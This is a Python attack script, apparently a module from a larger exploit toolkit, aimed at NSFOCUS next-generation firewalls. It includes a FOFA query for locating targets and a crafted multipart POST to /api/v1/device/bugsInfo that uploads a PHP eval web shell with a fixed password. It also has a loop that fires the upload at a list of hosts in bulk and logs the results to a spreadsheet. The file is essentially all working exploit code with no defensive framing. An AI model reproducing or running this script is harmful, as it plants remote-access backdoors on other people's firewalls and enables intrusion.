

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork


def help():
    print('''
    fofa: app="NSFOCUS-下一代防火墙"
        1. 绿盟防火墙, 上传webshell, 密码p@assW0rd, 支持蚁剑
    x. 退出
    ''')

def vul_ddi(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
        "Content-Type": "multipart/form-data; boundary=4803b59d015026999b45993b1245f0ef",
    }
    body = "--4803b59d015026999b45993b1245f0ef\r\n" \
              f"Content-Disposition: form-data; name=\"file\"; filename=\"compose.php\"\r\n" \
              "\r\n" \
              f"<?php eval($_POST['p@assW0rd']);?>\r\n" \
              "--4803b59d015026999b45993b1245f0ef\r\n"

    method = "POST"
    path = "/api/v1/device/bugsInfo"
    notes = ""
    return (url, method, headers, body, path, notes)


def run():
    OUTDIR = "result/绿盟防火墙"
    file = "dat.txt"
    li = Tool.read_host_file(file)
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    Tool.mkdir(OUTDIR)
    help()
    try:
        num = int(input("执行的指令: "))
    except ValueError:
        num = 99999

    if num == 1:
        data = []
        for url in li:
            item = vul_ddi(url)
            data.append(item)

        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/绿盟防火墙上传webshell.xlsx")

    else:
        print('bye....')
